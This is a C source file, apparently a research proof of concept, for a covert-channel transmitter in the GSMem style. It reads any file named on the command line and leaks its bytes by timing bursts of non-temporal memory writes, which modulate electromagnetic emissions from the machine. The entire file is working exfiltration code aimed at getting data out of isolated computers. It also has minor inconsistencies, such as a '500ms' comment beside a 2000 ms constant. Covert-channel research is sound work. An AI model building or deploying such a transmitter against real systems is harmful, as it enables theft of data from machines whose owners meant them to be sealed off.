/*
 * transmitter.c
 * 
 * Takes file names as arguments and transmits them via GSMem's covert channel
*/

#include "math.h"
#include "unistd.h"
#include "stdlib.h"
#include "stdint.h"
#include "stdio.h"
#include "transmitter.h"
#include "nmmintrin.h"
#include "immintrin.h"
#include "time.h"

//500ms
#define tx_time 2000

//return time in ms since epoch
long get_current_time(){
    struct timespec spec;
            //use CLOCK_MONOTONIC_COARSE for faster measurements
    clock_gettime(CLOCK_REALTIME, &spec);
    return round(spec.tv_nsec/1.0e6)+spec.tv_sec*1000;
}

//transmit a byte from the file, assuming LSB
void GSMtransmit8(unsigned char c){
    int bufsize=164096;
    unsigned char *buf=malloc(bufsize);
    unsigned char *start=buf;
    if(buf==NULL){
        fprintf(stderr, "Malloc failed\n");
    }
    
    __m128i vector1=_mm_set_epi64x(0x0f0f0d0d0b0b0909,0x0707050503030101);
    for(int i=0; i<8; ++i){
        uint8_t mask=1;
        if(mask&c){
/*
            long ms;
            time_t s;
            struct timespec spec;
            clock_gettime(CLOCK_MONOTONIC, &spec);

            //time in ms since epoch
            start_time=round(spec.tv_nsec/1.0e6)+spec.tv_sec*1000;
            clock_gettime(CLOCK_MONOTONIC, &spec);
            current_time=round(spec.tv_nsec/1.0e6)+spec.tv_sec*1000;
*/
            printf("1\n");
            long start_time=get_current_time();
            while(tx_time>get_current_time()-start_time){
               //MOVNTDQ
               for(int j=0;j<bufsize/16;++j){
                   _mm_stream_si128 ((__m128i *)buf , vector1); 
                   buf+=16;
               }
               buf=start;
            }
        } else{
            printf("0\n");
            usleep(tx_time*1000);
        }
        c>>=1;
        
    }
}

void usage(){
    printf("Usage: transmitter [FILE] ...\n");
}

int main(int argc, char **argv){
    if(argc==1){
        usage();
        exit(1);
    }
    printf("Begin covert channel:\n");
    FILE *fd=fopen(argv[1],"r");
    if(fd==NULL){
        fprintf(stderr, "File: %s not found.", argv[1]);
        exit(1);
    }
    fseek(fd, 0, SEEK_END);
    uint32_t fsize=ftell(fd);
    fseek(fd, 0, SEEK_SET);

    unsigned char *filebytes=malloc(fsize);
    fread(filebytes, fsize, 1, fd);
    fclose(fd);

    //transmit byte by byte
    for(unsigned int i=0; i<fsize; ++i){
        GSMtransmit8(filebytes[i]);
    }

}
